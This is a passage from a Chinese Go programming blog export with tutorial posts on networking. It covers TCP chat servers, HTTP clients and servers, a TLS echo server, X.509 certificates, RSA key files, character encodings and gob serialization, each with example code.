totalWritten += writtenThisCall &#125; &#125;(conn) &#125; &#125; &#125;&#125; 案例二： 案例二是一个服务器与客户端都混合在一起的例子。 案例二相对于案例一最大的改进在于，服务器为每一个客户端都新建了唯一的协程来处理数据。在协程中，通过一个通道来通信。当客户端通道接收到数据，即会往客户端发送消息。 程序更加稳健。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142package mainimport ( \"bufio\" \"flag\" \"fmt\" \"net\" \"os\" \"strings\" \"time\")//每一个客户端，服务器都新建了通道type ClientManager struct &#123; clients map[*Client]bool broadcast chan []byte register chan *Client unregister chan *Client&#125;type Client struct &#123; socket net.Conn data chan []byte&#125;func (manager *ClientManager) start() &#123; for &#123; select &#123; case connection := &lt;-manager.register: manager.clients[connection] = true fmt.Println(\"Added new connection!\") case connection := &lt;-manager.unregister: if _, ok := manager.clients[connection]; ok &#123; close(connection.data) delete(manager.clients, connection) fmt.Println(\"A connection has terminated!\") &#125; case message := &lt;-manager.broadcast: for connection := range manager.clients &#123; select &#123; case connection.data &lt;- message: default: close(connection.data) delete(manager.clients, connection) &#125; &#125; &#125; &#125;&#125;func (manager *ClientManager) receive(client *Client) &#123; for &#123; message := make([]byte, 4096) length, err := client.socket.Read(message) if err != nil &#123; manager.unregister &lt;- client client.socket.Close() break &#125; if length &gt; 0 &#123; fmt.Println(\"RECEIVED: \" + string(message)) manager.broadcast &lt;- message &#125; &#125;&#125;func (client *Client) receive() &#123; for &#123; message := make([]byte, 4096) length, err := client.socket.Read(message) if err != nil &#123; client.socket.Close() break &#125; if length &gt; 0 &#123; fmt.Println(\"RECEIVED: \" + string(message)) &#125; &#125;&#125;func (manager *ClientManager) send(client *Client) &#123; defer client.socket.Close() for &#123; select &#123; case message, ok := &lt;-client.data: if !ok &#123; return &#125; client.socket.Write(message) &#125; &#125;&#125;func startServerMode() &#123; fmt.Println(\"Starting server...\") listener, error := net.Listen(\"tcp\", \":12345\") if error != nil &#123; fmt.Println(error) &#125; manager := ClientManager&#123; clients: make(map[*Client]bool), broadcast: make(chan []byte), register: make(chan *Client), unregister: make(chan *Client), &#125; go manager.start() for &#123; connection, _ := listener.Accept() if error != nil &#123; fmt.Println(error) &#125; client := &amp;Client&#123;socket: connection, data: make(chan []byte)&#125; manager.register &lt;- client go manager.receive(client) go manager.send(client) &#125;&#125;func startClientMode() &#123; fmt.Println(\"Starting client...\") connection, error := net.Dial(\"tcp\", \"localhost:12345\") if error != nil &#123; fmt.Println(error) &#125; client := &amp;Client&#123;socket: connection&#125; go client.receive() for &#123; reader := bufio.NewReader(os.Stdin) message, _ := reader.ReadString('\\n') connection.Write([]byte(strings.TrimRight(message, \"\\n\"))) &#125;&#125;func main() &#123; flagMode := flag.String(\"mode\", \"server\", \"start in client or server mode\") flag.Parse() if strings.ToLower(*flagMode) == \"server\" &#123; startServerMode() &#125; else &#123; startClientMode() &#125;&#125; 案例3: 案例三是go语言圣经中的一段代码demo。 这段代码有点意思，服务器端绑定的是一个通道而不是socker连接的指针。 同时每一个客户端都有一个携程来处理发送信息的操作。从这一点和案例二很相似。但是缺陷也很大，不能处理断开连接的操作。只能关闭通道。 和案例二是没有办法比较的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596// Copyright © 2016 Alan A. A. Donovan &amp; Brian W. Kernighan.// License: https://creativecommons.org/licenses/by-nc-sa/4.0/// See page 254.//!+// Chat is a server that lets clients chat with each other.package mainimport ( \"bufio\" \"fmt\" \"log\" \"net\")//!+broadcastertype client chan&lt;- string // an outgoing message channelvar ( entering = make(chan client) leaving = make(chan client) messages = make(chan string) // all incoming client messages)func broadcaster() &#123; clients := make(map[client]bool) // all connected clients for &#123; select &#123; case msg := &lt;-messages: // Broadcast incoming message to all // clients' outgoing message channels. for cli := range clients &#123; cli &lt;- msg &#125; case cli := &lt;-entering: clients[cli] = true case cli := &lt;-leaving: delete(clients, cli) close(cli) &#125; &#125;&#125;//!-broadcaster//!+handleConnfunc handleConn(conn net.Conn) &#123; ch := make(chan string) // outgoing client messages go clientWriter(conn, ch) who := conn.RemoteAddr().String() ch &lt;- \"You are \" + who messages &lt;- who + \" has arrived\" entering &lt;- ch input := bufio.NewScanner(conn) for input.Scan() &#123; messages &lt;- who + \": \" + input.Text() &#125; // NOTE: ignoring potential errors from input.Err() leaving &lt;- ch messages &lt;- who + \" has left\" conn.Close()&#125;func clientWriter(conn net.Conn, ch &lt;-chan string) &#123; for msg := range ch &#123; fmt.Fprintln(conn, msg) // NOTE: ignoring network errors &#125;&#125;//!-handleConn//!+mainfunc main() &#123; listener, err := net.Listen(\"tcp\", \"localhost:8000\") if err != nil &#123; log.Fatal(err) &#125; go broadcaster() for &#123; conn, err := listener.Accept() if err != nil &#123; log.Print(err) continue &#125; go handleConn(conn) &#125;&#125;//!-main 总结 案例二具有良好的稳健型。服务器为每一个客户端都开辟了一个协程处理发送数据操作，通过通道来进行通信。能够解决案例三中不能解决的断开网络连接的操作，也能够解决案例一中开辟无数个协程以及消息堵塞不同步的问题。。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[16]-http","slug":"go-network-16-http","date":"2019-01-19T10:31:53.000Z","updated":"2019-02-04T08:39:13.915Z","comments":true,"path":"2019/01/19/go-network-16-http/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-16-http/","excerpt":"","text":"##获取网站内容 123456789101112131415161718192021222324252627package mainimport ( \"net/http\" \"io/ioutil\" \"fmt\")func main()&#123; resp,err:= http.Get(\"http://www.zhenai.com/zhenghun\") if err!=nil&#123; panic(err) &#125; defer resp.Body.Close() if resp.StatusCode == http.StatusOK&#123; all,err:=ioutil.ReadAll(resp.Body) if err!=nil&#123; panic(err) &#125; fmt.Printf(\"%s\\n\",all) &#125;&#125; 当charset为gbk时，转换为utf-8 下载辅助包 gopm get -g -v golang.org/x/text gopm get -g -v golang.org/x/net/html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package mainimport ( \"net/http\" \"io/ioutil\" \"fmt\" \"io\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\")func main()&#123; resp,err:= http.Get(\"http://www.chinanews.com/\") if err!=nil&#123; panic(err) &#125; defer resp.Body.Close() if resp.StatusCode != http.StatusOK&#123; fmt.Println(\"Error: status code\",resp.StatusCode) &#125; e:= determineEncoding(resp.Body) utf8reader:= transform.NewReader(resp.Body,e.NewDecoder()) all,err:= ioutil.ReadAll(utf8reader) if err!=nil&#123; panic(err) &#125; fmt.Printf(\"%s\\n\",all)&#125;func determineEncoding(r io.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; panic(err) &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125; http服务器1 访问localhost：8000，打印出URL.Path = “/” 1234567891011121314151617package mainimport ( \"fmt\" \"log\" \"net/http\")func main() &#123; http.HandleFunc(\"/\", handler) // each request calls handler log.Fatal(http.ListenAndServe(\"localhost:8000\", nil))&#125;// handler echoes the Path component of the requested URL.func handler(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, \"URL.Path = %q\\n\", r.URL.Path)&#125; http服务器2 计数： 1234567891011121314151617181920212223242526272829303132package mainimport ( \"fmt\" \"log\" \"net/http\" \"sync\")var mu sync.Mutexvar count intfunc main() &#123; http.HandleFunc(\"/\", handler) http.HandleFunc(\"/count\", counter) log.Fatal(http.ListenAndServe(\"localhost:8000\", nil))&#125;// handler echoes the Path component of the requested URL.func handler(w http.ResponseWriter, r *http.Request) &#123; mu.Lock() count++ mu.Unlock() fmt.Fprintf(w, \"URL.Path = %q\\n\", r.URL.Path)&#125;// counter echoes the number of calls so far.func counter(w http.ResponseWriter, r *http.Request) &#123; mu.Lock() fmt.Fprintf(w, \"Count %d\\n\", count) mu.Unlock()&#125; http服务器2 1234567891011121314151617181920212223242526272829package mainimport ( \"fmt\" \"log\" \"net/http\")func main() &#123; http.HandleFunc(\"/\", handler) log.Fatal(http.ListenAndServe(\"localhost:8000\", nil))&#125;//!+handler// handler echoes the HTTP request.func handler(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, \"%s %s %s\\n\", r.Method, r.URL, r.Proto) for k, v := range r.Header &#123; fmt.Fprintf(w, \"Header[%q] = %q\\n\", k, v) &#125; fmt.Fprintf(w, \"Host = %q\\n\", r.Host) fmt.Fprintf(w, \"RemoteAddr = %q\\n\", r.RemoteAddr) if err := r.ParseForm(); err != nil &#123; log.Print(err) &#125; for k, v := range r.Form &#123; fmt.Fprintf(w, \"Form[%q] = %q\\n\", k, v) &#125;&#125; 输出： 1234567891011GET / HTTP/1.1Header[&quot;Connection&quot;] = [&quot;keep-alive&quot;]Header[&quot;Upgrade-Insecure-Requests&quot;] = [&quot;1&quot;]Header[&quot;User-Agent&quot;] = [&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;]Header[&quot;Accept-Encoding&quot;] = [&quot;gzip, deflate, br&quot;]Header[&quot;Cookie&quot;] = [&quot;_ga=GA1.1.809627859.1535126425; io=nukCk_cXUcwmTK_-AAAC&quot;]Header[&quot;Cache-Control&quot;] = [&quot;max-age=0&quot;]Header[&quot;Accept&quot;] = [&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;]Header[&quot;Accept-Language&quot;] = [&quot;zh-CN,zh;q=0.9&quot;]Host = &quot;localhost:8000&quot;RemoteAddr = &quot;127.0.0.1:56512&quot; http文件服务器 12345678910111213141516171819202122232425262728/* File Server */package mainimport ( \"fmt\" \"net/http\" \"os\")func main() &#123; // deliver files from the directory /var/www //fileServer := http.FileServer(http.Dir(\"/var/www\")) fileServer := http.FileServer(http.Dir(\"/Users/jackson/\")) // register the handler and deliver requests to it err := http.ListenAndServe(\":8000\", fileServer) checkError(err) // That's it!&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[15]-tls","slug":"go-network-15-tls","date":"2019-01-19T09:44:23.000Z","updated":"2019-02-04T08:39:09.378Z","comments":true,"path":"2019/01/19/go-network-15-tls/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-15-tls/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/* TLSEchoServer */package mainimport ( \"crypto/rand\" \"crypto/tls\" \"fmt\" \"net\" \"os\" \"time\")func main() &#123; cert, err := tls.LoadX509KeyPair(\"jan.newmarch.name.pem\", \"private.pem\") checkError(err) config := tls.Config&#123;Certificates: []tls.Certificate&#123;cert&#125;&#125; now := time.Now() config.Time = func() time.Time &#123; return now &#125; config.Rand = rand.Reader service := \"0.0.0.0:1200\" listener, err := tls.Listen(\"tcp\", service, &amp;config) checkError(err) fmt.Println(\"Listening\") for &#123; conn, err := listener.Accept() if err != nil &#123; fmt.Println(err.Error()) continue &#125; fmt.Println(\"Accepted\") go handleClient(conn) &#125;&#125;func handleClient(conn net.Conn) &#123; defer conn.Close() var buf [512]byte for &#123; fmt.Println(\"Trying to read\") n, err := conn.Read(buf[0:]) if err != nil &#123; fmt.Println(err) &#125; _, err2 := conn.Write(buf[0:n]) if err2 != nil &#123; return &#125; &#125;&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; 客户端： 123456789101112131415161718192021222324252627282930313233343536373839/* TLSEchoClient */package mainimport ( \"fmt\" \"os\" \"crypto/tls\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Println(\"Usage: \", os.Args[0], \"host:port\") os.Exit(1) &#125; service := os.Args[1] conn, err := tls.Dial(\"tcp\", service, nil) checkError(err) for n := 0; n &lt; 10; n++ &#123; fmt.Println(\"Writing...\") conn.Write([]byte(\"Hello \" + string(n+48))) var buf [512]byte n, err := conn.Read(buf[0:]) checkError(err) fmt.Println(string(buf[0:n])) &#125; os.Exit(0)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[14]-x509","slug":"go-network-13-x509","date":"2019-01-19T09:26:19.000Z","updated":"2019-02-04T08:39:03.782Z","comments":true,"path":"2019/01/19/go-network-13-x509/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-13-x509/","excerpt":"","text":"PKI是Public Key Infrastructure的首字母缩写，翻译过来就是公钥基础设施；PKI是一种遵循标准的利用公钥加密技术为电子商务的开展提供一套安全基础平台的技术和规范。 目前使用的主要PKI基于X.509证书。例如，Web浏览器使用它们来验证网站的身份。 为网站生成自签名X.509证书并将其存储在.cer文件中的示例程序如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980/* GenX509Cert */package mainimport ( \"crypto/rand\" \"crypto/rsa\" \"crypto/x509\" \"crypto/x509/pkix\" \"encoding/gob\" \"encoding/pem\" \"fmt\" \"math/big\" \"os\" \"time\")func main() &#123; random := rand.Reader var key rsa.PrivateKey loadKey(\"private.key\", &amp;key) now := time.Now() then := now.Add(60 * 60 * 24 * 365 * 1000 * 1000 * 1000) // one year template := x509.Certificate&#123; SerialNumber: big.NewInt(1), Subject: pkix.Name&#123; CommonName: \"jan.newmarch.name\", Organization: []string&#123;\"Jan Newmarch\"&#125;, &#125;, // NotBefore: time.Unix(now, 0).UTC(), // NotAfter: time.Unix(now+60*60*24*365, 0).UTC(), NotBefore: now, NotAfter: then, SubjectKeyId: []byte&#123;1, 2, 3, 4&#125;, KeyUsage: x509.KeyUsageCertSign | x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature, BasicConstraintsValid: true, IsCA: true, DNSNames: []string&#123;\"jan.newmarch.name\", \"localhost\"&#125;, &#125; derBytes, err := x509.CreateCertificate(random, &amp;template, &amp;template, &amp;key.PublicKey, &amp;key) checkError(err) certCerFile, err := os.Create(\"jan.newmarch.name.cer\") checkError(err) certCerFile.Write(derBytes) certCerFile.Close() certPEMFile, err := os.Create(\"jan.newmarch.name.pem\") checkError(err) pem.Encode(certPEMFile, &amp;pem.Block&#123;Type: \"CERTIFICATE\", Bytes: derBytes&#125;) certPEMFile.Close() keyPEMFile, err := os.Create(\"private.pem\") checkError(err) pem.Encode(keyPEMFile, &amp;pem.Block&#123;Type: \"RSA PRIVATE KEY\", Bytes: x509.MarshalPKCS1PrivateKey(&amp;key)&#125;) keyPEMFile.Close()&#125;func loadKey(fileName string, key interface&#123;&#125;) &#123; inFile, err := os.Open(fileName) checkError(err) decoder := gob.NewDecoder(inFile) err = decoder.Decode(key) checkError(err) inFile.Close()&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; 读取： 1234567891011121314151617181920212223242526272829303132333435/* ReadX509Cert */package mainimport ( \"crypto/x509\" \"fmt\" \"os\")func main() &#123; certCerFile, err := os.Open(\"jan.newmarch.name.cer\") checkError(err) derBytes := make([]byte, 1000) // bigger than the file count, err := certCerFile.Read(derBytes) checkError(err) certCerFile.Close() // trim the bytes to actual length in call cert, err := x509.ParseCertificate(derBytes[0:count]) checkError(err) fmt.Printf(\"Name %s\\n\", cert.Subject.CommonName) fmt.Printf(\"Not before %s\\n\", cert.NotBefore.String()) fmt.Printf(\"Not after %s\\n\", cert.NotAfter.String())&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[13]-rsa","slug":"go-network-13-rsa","date":"2019-01-19T09:20:41.000Z","updated":"2019-02-04T08:38:58.886Z","comments":true,"path":"2019/01/19/go-network-13-rsa/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-13-rsa/","excerpt":"","text":"rsa公钥加密 产生公钥私钥并存入文件中。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/* GenRSAKeys */package mainimport ( \"crypto/rand\" \"crypto/rsa\" \"crypto/x509\" \"encoding/gob\" \"encoding/pem\" \"fmt\" \"os\")func main() &#123; reader := rand.Reader bitSize := 512 key, err := rsa.GenerateKey(reader, bitSize) checkError(err) fmt.Println(\"Private key primes\", key.Primes[0].String(), key.Primes[1].String()) fmt.Println(\"Private key exponent\", key.D.String()) publicKey := key.PublicKey fmt.Println(\"Public key modulus\", publicKey.N.String()) fmt.Println(\"Public key exponent\", publicKey.E) saveGobKey(\"private.key\", key) saveGobKey(\"public.key\", publicKey) savePEMKey(\"private.pem\", key)&#125;func saveGobKey(fileName string, key interface&#123;&#125;) &#123; outFile, err := os.Create(fileName) checkError(err) encoder := gob.NewEncoder(outFile) err = encoder.Encode(key) checkError(err) outFile.Close()&#125;func savePEMKey(fileName string, key *rsa.PrivateKey) &#123; outFile, err := os.Create(fileName) checkError(err) var privateKey = &amp;pem.Block&#123;Type: \"RSA PRIVATE KEY\", Bytes: x509.MarshalPKCS1PrivateKey(key)&#125; pem.Encode(outFile, privateKey) outFile.Close()&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; 反向读取 123456789101112131415161718192021222324252627282930313233343536373839404142/* LoadRSAKeys */package mainimport ( \"crypto/rsa\" \"encoding/gob\" \"fmt\" \"os\")func main() &#123; var key rsa.PrivateKey loadKey(\"private.key\", &amp;key) fmt.Println(\"Private key primes\", key.Primes[0].String(), key.Primes[1].String()) fmt.Println(\"Private key exponent\", key.D.String()) var publicKey rsa.PublicKey loadKey(\"public.key\", &amp;publicKey) fmt.Println(\"Public key modulus\", publicKey.N.String()) fmt.Println(\"Public key exponent\", publicKey.E)&#125;func loadKey(fileName string, key interface&#123;&#125;) &#123; inFile, err := os.Open(fileName) checkError(err) decoder := gob.NewDecoder(inFile) err = decoder.Decode(key) checkError(err) inFile.Close()&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[12]-ascii","slug":"go-network-12-ascii","date":"2019-01-19T08:49:07.000Z","updated":"2019-02-04T08:38:53.924Z","comments":true,"path":"2019/01/19/go-network-12-ascii/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-12-ascii/","excerpt":"","text":"ASCII码表 使用7位进行编码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566Oct Dec Hex Char Oct Dec Hex Char------------------------------------------------------------000 0 00 NUL &apos;\\0&apos; 100 64 40 @001 1 01 SOH 101 65 41 A002 2 02 STX 102 66 42 B003 3 03 ETX 103 67 43 C004 4 04 EOT 104 68 44 D005 5 05 ENQ 105 69 45 E006 6 06 ACK 106 70 46 F007 7 07 BEL &apos;\\a&apos; 107 71 47 G010 8 08 BS &apos;\\b&apos; 110 72 48 H011 9 09 HT &apos;\\t&apos; 111 73 49 I012 10 0A LF &apos;\\n&apos; 112 74 4A J013 11 0B VT &apos;\\v&apos; 113 75 4B K014 12 0C FF &apos;\\f&apos; 114 76 4C L015 13 0D CR &apos;\\r&apos; 115 77 4D M016 14 0E SO 116 78 4E N017 15 0F SI 117 79 4F O020 16 10 DLE 120 80 50 P021 17 11 DC1 121 81 51 Q022 18 12 DC2 122 82 52 R023 19 13 DC3 123 83 53 S024 20 14 DC4 124 84 54 T025 21 15 NAK 125 85 55 U026 22 16 SYN 126 86 56 V027 23 17 ETB 127 87 57 W030 24 18 CAN 130 88 58 X031 25 19 EM 131 89 59 Y032 26 1A SUB 132 90 5A Z033 27 1B ESC 133 91 5B [034 28 1C FS 134 92 5C \\ &apos;\\\\&apos;035 29 1D GS 135 93 5D ]036 30 1E RS 136 94 5E ^037 31 1F US 137 95 5F _040 32 20 SPACE 140 96 60 `041 33 21 ! 141 97 61 a042 34 22 &quot; 142 98 62 b043 35 23 # 143 99 63 c044 36 24 $ 144 100 64 d045 37 25 % 145 101 65 e046 38 26 &amp; 146 102 66 f047 39 27 &apos; 147 103 67 g050 40 28 ( 150 104 68 h051 41 29 ) 151 105 69 i052 42 2A * 152 106 6A j053 43 2B + 153 107 6B k054 44 2C , 154 108 6C l055 45 2D - 155 109 6D m056 46 2E . 156 110 6E n057 47 2F / 157 111 6F o060 48 30 0 160 112 70 p061 49 31 1 161 113 71 q062 50 32 2 162 114 72 r063 51 33 3 163 115 73 s064 52 34 4 164 116 74 t065 53 35 5 165 117 75 u066 54 36 6 166 118 76 v067 55 37 7 167 119 77 w070 56 38 8 170 120 78 x071 57 39 9 171 121 79 y072 58 3A : 172 122 7A z073 59 3B ; 173 123 7B &#123;074 60 3C &lt; 174 124 7C |075 61 3D = 175 125 7D &#125;076 62 3E &gt; 176 126 7E ~077 63 3F ? 177 127 7F DEL ISO 8859 八位字节现在是字节的标准大小。这允许128个额外的代码点用于ASCII的扩展。ISO 8859系列是许多不同的代码集，用于捕获各种欧洲语言子集的所有组成部分。ISO 8859-1也被称为Latin-1，涵盖了西欧的许多语言，而本系列中的其他语言涵盖欧洲其他地区，甚至包括希伯来语，阿拉伯语和泰语。例如，ISO 8859-5包括俄罗斯等国家的西里尔字符，而ISO 8859-8包括希伯来字母。 这些字符集的标准编码是将其代码点用作8位值。例如，ISO 8859-1中的字符“Á”具有代码点193并编码为193.所有ISO 8859系列都具有与ASCII相同的底部128个值，因此ASCII字符在所有中都是相同的这些集。 用于推荐ISO 8859-1字符集的HTML规范。HTML 3.2是最后一个这样做的，之后HTML 4.0推荐使用Unicode。在2010年，谷歌估计其所看到的页面，大约20％仍然是ISO 8859格式，而20％仍然是ASCII（Unicode接近50％的网络）。 ASCII和ISO 8859都不包括基于象形文字的语言。据估计，中国有大约20,000个单独的字符，大约有5,000个常用字符。这些需要多一个字节，通常使用两个字节。这些双字节字符集有很多：Big5，EUC-TW，GB2312和GBK / GBX用于中文，JIS X 0208用于日语，等等。这些编码通常不是相互兼容的。 Unicode是一个包含标准的字符集，旨在涵盖所有正在使用的主要字符集。它包括欧洲，亚洲，印度等等。它现在是5.2版本，有超过107,000个字符。 前256个代码点对应于ISO 8859-1，US ASCII作为前128个。因此，这些主要字符集向后兼容，因为ISO 8859-1和ASCII的代码点在Unicode中完全相同。 要在计算机系统中表示Unicode字符，必须使用编码。编码UCS是使用Unicode字符的代码点值的双字节编码。但是，由于Unicode中现在有太多字符使它们全部适合2个字节，因此该编码已过时且不再使用。相反，有： UTF-32是一个4字节编码，但不常用，HTML 5明确警告不要使用它 UTF-16将最常见的字符编码为2个字节，另外2个字节用于“溢出”，ASCII和ISO 8859-1具有通常的值 UTF-8每个字符使用1到4个字节，ASCII具有通常的值（但不是ISO 8859-1） 有时使用UTF-7，但不常见 UTF-8是最常用的编码。谷歌估计它看到的50％的页面都是用UTF-8编码的。ASCII集具有相同的UTF-8编码值，因此UTF-8阅读器可以读取仅包含ASCII字符的文本以及完整Unicode集中的文本。 Go在其字符串中使用UTF-8编码的字符。每个角色都是类型rune。这是一个别名，int32因为Unicode字符可以是UTF-8编码中的1,2或4个字节。就字符而言，字符串是runes 的数组。 字符串也是一个字节数组，但您必须要小心：只有ASCII子集是一个等于字符的字节。所有其他字符占用两个，三个或四个字节。这意味着以字符（符文）表示的字符串长度通常与其字节数组的长度不同。仅当字符串仅由ASCII字符组成时，它们才相等。 以下程序片段说明了这一点。如果我们使用UTF-8字符串并测试其长度，则获得基础字节数组的长度。但是如果你将字符串转换为符文数组，[]rune那么你得到一个Unicode代码点数组，通常是字符数： 123str := &quot;百度一下，你就知道&quot;println(&quot;String length&quot;, len([]rune(str)))println(&quot;Byte length&quot;, len(str)) 输出： 12String length 9Byte length 27","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[11]-gob","slug":"go-network-11-gob","date":"2019-01-19T07:11:53.000Z","updated":"2019-02-04T08:38:48.801Z","comments":true,"path":"2019/01/19/go-network-11-gob/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-11-gob/","excerpt":"","text":"Gob是Go特有的序列化技术。它专门用于编码Go数据类型，目前不支持或由任何其他语言支持。它支持除通道和函数之外的所有Go数据类型。它支持所有类型和大小的整数，字符串和布尔值，结构，数组和切片。目前它在圆形结构（如环）方面存在一些问题，但随着时间的推移会有所改善。 Gob将类型信息编码为其序列化形式。这比X.509序列化中的类型信息要广泛得多，但远比XML文档中包含的类型信息更有效。 gob到文件中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* SaveGob */package mainimport ( \"fmt\" \"os\" \"encoding/gob\")type Person struct &#123; Name Name Email []Email&#125;type Name struct &#123; Family string Personal string&#125;type Email struct &#123; Kind string Address string&#125;func main() &#123; person := Person&#123; Name: Name&#123;Family: \"Newmarch\", Personal: \"Jan\"&#125;, Email: []Email&#123;Email&#123;Kind: \"home\", Address: \"jan@newmarch.name\"&#125;, Email&#123;Kind: \"work\", Address: \"j.newmarch@boxhill.edu.au\"&#125;&#125;&#125; saveGob(\"person.gob\", person)&#125;func saveGob(fileName string, key interface&#123;&#125;) &#123; outFile, err := os.Create(fileName) checkError(err) encoder := gob.NewEncoder(outFile) err = encoder.Encode(key) checkError(err) outFile.Close()&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; 文件加载到内存 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* LoadGob */package mainimport ( \"fmt\" \"os\" \"encoding/gob\")type Person struct &#123; Name Name Email []Email&#125;type Name struct &#123; Family string Personal string&#125;type Email struct &#123; Kind string Address string&#125;func (p Person) String() string &#123; s := p.Name.Personal + \" \" + p.Name.Family for _, v := range p.Email &#123; s += \"\\n\" + v.Kind + \": \" + v.Address &#125; return s&#125;func main() &#123; var person Person loadGob(\"person.gob\", &amp;person) fmt.Println(\"Person\", person.String())&#125;func loadGob(fileName string, key interface&#123;&#125;) &#123; inFile, err := os.Open(fileName) checkError(err) decoder := gob.NewDecoder(inFile) err = decoder.Decode(key) checkError(err) inFile.Close()&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; gob服务器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/* Gob EchoServer */package mainimport ( \"fmt\" \"net\" \"os\" \"encoding/gob\")type Person struct &#123; Name Name Email []Email&#125;type Name struct &#123; Family string Personal string&#125;type Email struct &#123; Kind string Address string&#125;func (p Person) String() string &#123; s := p.Name.Personal + \" \" + p.Name.Family for _, v := range p.Email &#123; s += \"\\n\" + v.Kind + \": \" + v.Address &#125; return s&#125;func main() &#123; service := \"0.0.0.0:1200\" tcpAddr, err := net.ResolveTCPAddr(\"tcp\", service) checkError(err) listener, err := net.ListenTCP(\"tcp\", tcpAddr) checkError(err) for &#123; conn, err := listener.Accept() if err != nil &#123; continue &#125; encoder := gob.NewEncoder(conn) decoder := gob.NewDecoder(conn) for n := 0; n &lt; 10; n++ &#123; var person Person decoder.Decode(&amp;person) fmt.Println(person.String()) encoder.Encode(person) &#125; conn.Close() // we're finished &#125;&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Println(\"Fatal error \", err.Error()) os.Exit(1) &#125;&#125; gob客户端 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071/* Gob EchoClient */package mainimport ( \"fmt\" \"net\" \"os\" \"encoding/gob\" \"bytes\" \"io\")type Person struct &#123; Name Name Email []Email&#125;type Name struct &#123; Family string Personal string&#125;type Email struct &#123; Kind string Address string&#125;func (p Person) String() string &#123; s := p.Name.Personal + \" \" + p.Name.Family for _, v := range p.Email &#123; s += \"\\n\" + v.Kind + \": \" + v.Address &#125; return s&#125;func main() &#123; person := Person&#123; Name: Name&#123;Family: \"Newmarch\", Personal: \"Jan\"&#125;, Email: []Email&#123;Email&#123;Kind: \"home\", Address: \"jan@newmarch.name\"&#125;, Email&#123;Kind: \"work\", Address: \"j.newmarch@boxhill.edu.au\"&#125;&#125;&#125; if len(os.Args) != 2 &#123; fmt.Println(\"Usage: \", os.Args[0], \"host:port\") os.Exit(1) &#125; service := os.Args[1] conn, err := net.Dial(\"tcp\", service) checkError(err) encoder := gob.NewEncoder(conn) decoder := gob.NewDecoder(conn) for n := 0; n &lt; 10; n++ &#123; encoder.Encode(person) var newPerson Person decoder.Decode(&amp;newPerson) 